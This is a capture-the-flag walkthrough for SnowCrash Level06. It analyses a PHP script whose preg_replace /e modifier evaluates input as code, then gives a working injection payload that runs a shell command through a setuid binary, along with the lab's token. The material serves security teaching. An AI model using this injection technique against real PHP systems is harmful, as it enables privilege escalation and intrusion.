# 🚩 SnowCrash — Level06

## 🎯 Goal

Find the password for **flag06**.

---

## 1. Check the current directory

```bash
ls -la
```

**Result:**

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

A setuid binary `level06` and a PHP script `level06.php`.

---

## 2. Analyze the PHP script

```bash
cat level06.php
```

**Content:**

```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

**Code explanation:**

**Function `y($m)`:**
- Purpose: Sanitize input by replacing special characters
- Replaces `.` (dot) with ` x ` (space-x-space)
- Replaces `@` with ` y` (space-y)
- Returns the sanitized string

**Function `x($y, $z)`:**
- `$y`: filename to read (first argument)
- `$z`: unused second argument
- Reads file contents with `file_get_contents($y)`
- Searches for pattern `[x ...]` and processes the content inside
- Replaces all `[` with `(`
- Replaces all `]` with `)`
- Returns the processed string

**Main execution:**
- Takes filename from command line argument `$argv[1]`
- Calls function `x()` to process the file
- Prints the result

**Critical vulnerability:**
- The `/e` modifier in `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)` evaluates the replacement as **PHP code**
- `\\2` is the captured group (content between `[x` and `]`)
- Instead of replacing text, it **executes** `y("content")` as PHP code
- The `/e` modifier is deprecated (removed in PHP 7.0) because it allows arbitrary code execution

---

## 3. Exploit via preg_replace /e modifier

The `/e` modifier causes the replacement string to be evaluated as PHP code. We can inject shell commands.

Create a malicious file:

```bash
echo '[x ${`getflag`}]' > /tmp/exploit06
```

Execute the setuid binary with this file:

```bash
./level06 /tmp/exploit06
```

**How it works:**
1. The pattern `[x ...]` matches our input `[x ${`getflag`}]`
2. Due to the `/e` modifier, the replacement `y("\\2")` is evaluated as PHP code
3. During evaluation, `\\2` becomes `${`getflag`}`
4. The backticks `` `getflag` `` execute as a shell command with **flag06** privileges
5. The command returns: `Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub`
6. PHP tries to interpret this output as a variable name in the code `y("Check flag.Here...")`
7. Since `Check flag.Here...` is not a valid variable name, PHP throws an "Undefined variable" error
8. The error message reveals the token from the getflag output

**Note:** Function `y()` is never successfully called because the getflag output creates invalid PHP syntax during evaluation. The exploit works by executing the command and extracting the token from the resulting error message.

---

## ✅ Result

```bash
./level06 /tmp/exploit06
```

Output:

```
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

---

## 🎉 **Final Token for Level06**

```
wiok45aaoguiboiki2tuin6ub
```
